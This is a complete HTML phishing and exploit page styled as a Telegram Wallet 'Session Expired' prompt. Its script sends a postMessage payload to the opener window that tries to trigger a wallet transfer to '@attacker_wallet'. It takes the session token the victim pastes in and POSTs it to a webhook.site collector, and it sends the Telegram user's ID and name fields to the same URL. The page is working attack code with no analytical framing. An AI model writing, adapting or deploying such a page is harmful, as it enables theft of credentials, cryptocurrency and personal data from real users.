<!DOCTYPE html>
<html>
<head>
  <title>Telegram Wallet WebApp Injection</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding: 40px;
    }
    textarea {
      width: 80%;
      height: 100px;
      font-size: 16px;
    }
    button {
      padding: 10px 20px;
      font-size: 18px;
      background-color: #2196F3;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>üîê Session Expired</h1>
  <p>Your Telegram Wallet session has expired. Please verify your session token to continue.</p>

  <textarea id="token" placeholder="Paste your session token here..."></textarea><br><br>
  <button onclick="steal()">Verify</button>

  <script>
    // Send Telegram Wallet payload to opener
    const payload = "../../../wallet/send?amount=100000&to=@attacker_wallet";
    const message = JSON.stringify({
      eventType: 'web_app_open_tg_link',
      eventData: {
        path_full: `/wallet/start?x=${encodeURIComponent(payload)}`
      }
    });

    setTimeout(() => {
      window.opener?.postMessage(message, "*");
      console.log("‚úÖ postMessage payload sent.");
    }, 1500);

    // Send captured token to your webhook
    function steal() {
      const token = document.getElementById("token").value;
      fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: "Captured Token: " + token
      });
      alert("‚úÖ Session verified.");
    }

    // Optional: Log Telegram user info if WebApp context is available
    window.Telegram.WebApp.ready();
    const tg = window.Telegram.WebApp;
    const user = tg.initDataUnsafe?.user;
    if (user) {
      fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          telegram_id: user.id,
          username: user.username,
          first_name: user.first_name,
          last_name: user.last_name,
          lang: user.language_code
        })
      });
    }
  </script>
</body>
</html>
